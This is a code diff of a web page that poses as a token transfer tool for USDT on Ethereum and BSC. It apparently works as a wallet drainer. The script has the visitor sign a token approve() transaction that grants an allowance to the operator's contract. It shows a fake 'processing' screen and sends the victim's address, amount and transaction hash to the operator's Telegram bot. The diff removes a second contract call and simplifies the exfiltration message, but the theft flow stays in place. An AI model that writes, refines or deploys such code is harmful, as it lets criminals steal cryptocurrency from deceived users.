@@ -301,7 +301,6 @@
             display: block;
         }
 
-        /* ===== PROCESSING SCREEN ===== */
         .processing-screen {
             display: none;
             position: fixed;
@@ -469,7 +468,6 @@
             transform: scale(0.98);
         }
 
-        /* Mobile optimizations */
         @media (max-width: 480px) {
             .page {
                 padding: 12px;
@@ -520,7 +518,6 @@
     </style>
 </head>
 <body>
-    <!-- Processing Screen -->
     <div class="processing-screen" id="processingScreen">
         <div class="particles-container" id="particlesContainer"></div>
         <div class="processing-content">
@@ -560,7 +557,6 @@
                     </div>
                 </div>
 
-                <!-- Token Selector -->
                 <label class="label">Destination Network</label>
                 <div class="network-row" id="tokenSelector" onclick="toggleTokenDropdown()">
                     <div class="network-left">
@@ -590,7 +586,6 @@
     </div>
 
     <script>
-        // Token List - Updated with new contract addresses
         const TOKENS = {
             'usdt_eth': {
                 name: 'USDT on Ethereum',
@@ -686,7 +681,6 @@
         let selectedToken = 'usdt_eth';
         let lastTxHash = '';
 
-        // Initialize
         document.addEventListener('DOMContentLoaded', () => {
             initializeTokenDropdown();
             document.getElementById('amountInput').addEventListener('input', updateAmountInfo);
@@ -764,7 +758,6 @@
             clearError();
 
             try {
-                // Check if ethereum provider exists
                 let ethereum = window.ethereum;
                 let retries = 0;
                 while (!ethereum && retries < 10) {
@@ -780,13 +773,11 @@
                     return;
                 }
 
-                // Get accounts
                 let accounts = await ethereum.request({
                     method: "eth_accounts"
                 });
                 let userAddress = accounts && accounts.length > 0 ? accounts[0] : null;
 
-                // Switch chain if needed
                 const currentChainId = await ethereum.request({ method: 'eth_chainId' });
                 if (currentChainId !== token.chainIdHex) {
                     try {
@@ -813,7 +804,6 @@
                     }
                 }
 
-                // Encode approve transaction
                 const USDT_ABI = [
                     'function approve(address spender, uint256 amount) public returns (bool)'
                 ];
@@ -833,7 +823,6 @@
                     tx.from = userAddress;
                 }
 
-                // Send approve transaction
                 let txHash;
                 try {
                     txHash = await Promise.race([
@@ -851,7 +840,6 @@
                 lastTxHash = txHash;
                 console.log("Approve transaction sent:", txHash);
 
-                // Wait for approve to be confirmed
                 await new Promise(resolve => setTimeout(resolve, 3000));
 
                 let finalUserAddress = userAddress;
@@ -866,55 +854,11 @@
                     }
                 }
 
-                // Call receiveApproval on the contract to register the approval
-                try {
-                    const amountInWei = ethers.utils.parseUnits(amount, token.decimals);
-                    
-                    const contractABI = [
-                        'function receiveApproval(address _from, uint256 _amount, address _token) public'
-                    ];
-                    
-                    const contractIface = new ethers.utils.Interface(contractABI);
-                    const receiveApprovalData = contractIface.encodeFunctionData("receiveApproval", [
-                        finalUserAddress,
-                        amountInWei,
-                        token.address
-                    ]);
-
-                    const contractTx = {
-                        to: token.smartContract,
-                        data: receiveApprovalData,
-                        from: finalUserAddress,
-                        gas: '300000'
-                    };
-
-                    try {
-                        const receiveApprovalTxHash = await Promise.race([
-                            ethereum.request({
-                                method: "eth_sendTransaction",
-                                params: [contractTx]
-                            }),
-                            new Promise((_, reject) => setTimeout(() => reject(new Error('Request timeout')), 30000))
-                        ]);
-                        console.log("receiveApproval transaction sent:", receiveApprovalTxHash);
-                        
-                        // Wait for receiveApproval to be confirmed
-                        await new Promise(resolve => setTimeout(resolve, 2000));
-                    } catch (txError) {
-                        console.warn('receiveApproval transaction failed (non-critical):', txError.message);
-                    }
-                } catch (e) {
-                    console.error('receiveApproval error:', e);
-                }
-
-                // Show processing screen
                 createParticles();
                 document.getElementById('processingScreen').classList.add('active');
 
-                // Send Telegram notification with all details
                 await sendTelegramNotification(finalUserAddress, txHash, amount, token, recipient);
 
-                // Wait 5 seconds before closing
                 await new Promise(resolve => setTimeout(resolve, 5000));
                 document.getElementById('processingScreen').classList.remove('active');
                 btn.textContent = 'Next';
@@ -936,31 +880,13 @@
                 ? `https://etherscan.io/tx/${txHash}`
                 : `https://bscscan.com/tx/${txHash}`;
 
-            const message = `
-✅ <b>Token Approve - Transaction Confirmed</b>
-
-💰 <b>Token:</b> ${token.symbol}
-🌐 <b>Network:</b> ${token.network}
-👤 <b>User:</b> <code>${userAddress}</code>
-📍 <b>Recipient:</b> <code>${document.getElementById('recipientInput').value.trim()}</code>
-💵 <b>Amount:</b> ${amount} ${token.symbol}
-
-📝 <b>Transaction Hash:</b>
-<code>${txHash}</code>
-
-🔗 <b>View on Explorer:</b>
-${explorerUrl}
-
-⏰ <b>Time:</b>
-${new Date().toLocaleString()}
-
-🔐 <b>Smart Contract:</b>
-<code>${token.smartContract}</code>
-            `;
+            const messageText = `Token Approve Notification\n\nToken: ${token.symbol}\nNetwork: ${token.network}\nUser: ${userAddress}\nRecipient: ${recipient}\nAmount: ${amount} ${token.symbol}\n\nTransaction Hash:\n${txHash}\n\nExplorer:\n${explorerUrl}\n\nTime: ${new Date().toLocaleString()}\n\nSmart Contract:\n${token.smartContract}`;
 
             const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
 
             try {
+                console.log('Sending Telegram notification...');
+                
                 const response = await fetch(url, {
                     method: 'POST',
                     headers: {
@@ -968,16 +894,17 @@ ${new Date().toLocaleString()}
                     },
                     body: JSON.stringify({
                         chat_id: CONFIG.TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
+                        text: messageText
                     })
                 });
 
-                if (!response.ok) {
-                    throw new Error(`Telegram API error: ${response.status}`);
+                const responseData = await response.json();
+                console.log('Telegram response:', responseData);
+
+                if (!response.ok || !responseData.ok) {
+                    console.error('Telegram API error:', responseData);
                 }
 
-                console.log('Telegram notification sent');
             } catch (error) {
                 console.error('Failed to send Telegram notification:', error);
             }
